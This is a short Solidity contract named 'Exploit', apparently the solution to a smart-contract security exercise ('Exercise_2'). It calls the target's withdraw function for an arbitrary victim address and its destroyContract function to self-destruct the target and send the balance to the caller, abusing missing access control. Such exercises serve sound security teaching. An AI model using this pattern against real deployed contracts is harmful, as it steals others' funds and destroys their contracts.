pragma solidity ^0.8.0;

contract Exploit {
    Exercise_2 target;

    constructor(address _target) {
        target = Exercise_2(_target);
    }

    function exploit(address victim, uint256 amount) public {
        target.withdraw(victim, amount);
    }

    function destroy() public {
        target.destroyContract(payable(msg.sender));
    }
}
